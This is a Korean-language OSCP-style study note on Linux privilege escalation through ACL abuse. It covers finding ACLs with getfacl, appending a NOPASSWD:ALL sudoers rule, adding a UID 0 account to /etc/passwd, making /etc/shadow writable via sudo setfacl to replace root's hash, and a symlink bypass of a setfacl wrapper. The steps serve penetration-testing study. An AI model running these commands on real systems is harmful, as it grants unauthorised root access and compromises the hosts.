# 11_ACL_악용

# 리눅스 권한상승 — ACL 악용

---

## 개념

ACL(Access Control List)은 전통적인 owner/group/other 3분류 권한 모델을 확장해서, 특정 유저나 그룹에게 개별적으로 권한을 추가로 부여하는 기능이다. 문제는 `ls -l`이 보여주는 기본 권한 비트만으로는 ACL의 존재를 알 수 없다는 점이다 — 파일이 `440`(root만 읽기)처럼 극도로 restrictive해 보여도, ACL이 별도로 특정 계정에게 읽기/쓰기를 열어줄 수 있다.

OSCP 관점에서는 두 방향으로 쓰인다. 첫째, **이미 걸려 있는 취약한 ACL을 발견해서 악용**하는 경우(가장 흔함). 둘째, sudo로 `setfacl`을 직접 실행할 수 있는 상황에서 **원하는 파일에 ACL을 걸어 권한상승**하는 경우다.

```bash
# ACL 확인 기본
getfacl <파일경로>
ls -la <파일경로>   # 권한 끝에 + 가 있으면 ACL 존재

# 시스템 전체에서 ACL 걸린 파일 찾기
getfacl -R -s -p / 2>/dev/null | grep -B3 "^# file:"
```

---

## 발견 — 취약한 ACL 찾기

`find`나 `getfacl -R`로 전체 스캔하면 시간이 오래 걸릴 수 있으므로, 우선순위가 높은 경로(홈 디렉터리, `/etc/sudoers.d/`, `/etc/passwd`, 백업/설정 디렉터리)부터 확인한다. LinPEAS도 ACL 걸린 파일을 자동 탐지해준다.

```bash
# 우선순위 경로부터 확인
getfacl /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
getfacl -R /etc/sudoers.d/ 2>/dev/null
getfacl -R /home/ 2>/dev/null | grep -B3 "^# file:"

# 전체 스캔 (느림, 백그라운드로 실행)
getfacl -R -s -p / 2>/dev/null > /tmp/acl_scan.txt &
```

---

## 사례 1 — sudoers.d 파일의 ACL 쓰기 권한

`/etc/sudoers.d/` 안의 파일이 `440`(소유자·그룹만 읽기)으로 보여도, ACL이 별도로 현재 계정에게 쓰기 권한을 열어줄 수 있다. `ls -l`만 보고 넘어가면 절대 발견 못 하는 케이스라서 실전 난이도가 높다.

```bash
# 겉보기 권한은 안전해 보임
ls -l /etc/sudoers.d/*
# -r--r----- 1 root root ... /etc/sudoers.d/custom

# 하지만 ACL을 확인하면
getfacl /etc/sudoers.d/custom
# user:<내계정>:rw-  ← 이 항목이 핵심, 쓰기 가능

# sudo 규칙 직접 추가
echo '<내계정> ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/custom
visudo -cf /etc/sudoers.d/custom   # 문법 검증 (실패하면 sudo 자체가 깨질 수 있음)
sudo -l
sudo su
```

---

## 사례 2 — /etc/passwd ACL 쓰기 권한

`/etc/passwd`는 보통 `644`(모두 읽기, root만 쓰기)라서 안전해 보이지만, ACL로 특정 계정에 쓰기가 열려 있으면 UID 0 계정을 직접 추가할 수 있다.

```bash
getfacl /etc/passwd
# user:<내계정>:rw-  ← 쓰기 가능 신호

# 비밀번호 해시 생성
openssl passwd -1 -salt hack pass123
# $1$hack$xxxxxxxxxxxxxxxxxxxx

# UID 0 계정 추가
echo 'root2:$1$hack$xxxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash' >> /etc/passwd

# 로그인
su root2
```

---

## 사례 3 — sudo로 setfacl 자체가 허용된 경우

`sudo -l`에 `setfacl`이 직접 보이면 원하는 파일에 임의로 쓰기 ACL을 걸 수 있다. `/etc/shadow`, `/etc/sudoers`처럼 원래 root만 쓸 수 있는 파일에 내 계정 ACL을 추가하는 방식이다.

```bash
# sudo -l 예시
(root) NOPASSWD: /usr/bin/setfacl

# /etc/shadow에 쓰기 권한 추가
sudo /usr/bin/setfacl -m u:<내계정>:rw /etc/shadow

# 이제 일반 권한으로 /etc/shadow 수정 가능
openssl passwd -1 -salt hack newpass
vi /etc/shadow
# root 라인의 해시를 위에서 만든 해시로 교체

su root
```

---

## 스크립트로 ACL이 우회되는 경우 (setfacl 래퍼 스크립트)

sudo로 실행 가능한 스크립트가 내부에서 `setfacl`을 호출하면서 대상 경로 검증이 허술하면(`..` 경로 조작, 심볼릭 링크 미검증 등), 스크립트가 허용한 범위 밖의 파일에도 ACL을 걸 수 있다.

```bash
# 스크립트 내용 확인
cat /opt/acl.sh
# 사용법: acl.sh <user> <perm> <target>  형태로 setfacl 래핑하는 경우가 흔함

# 경로 검증이 허술하면 심볼릭 링크로 우회
ln -s /etc/shadow /home/<내계정>/fake_target
sudo /opt/acl.sh <내계정> rw /home/<내계정>/fake_target
getfacl /etc/shadow
```

---

## 마무리 확인

```bash
id
whoami
sudo -l

# ACL로 변경한 파일은 원상복구 고려 (특히 시험/평가 환경)
setfacl -b <변경한파일>
```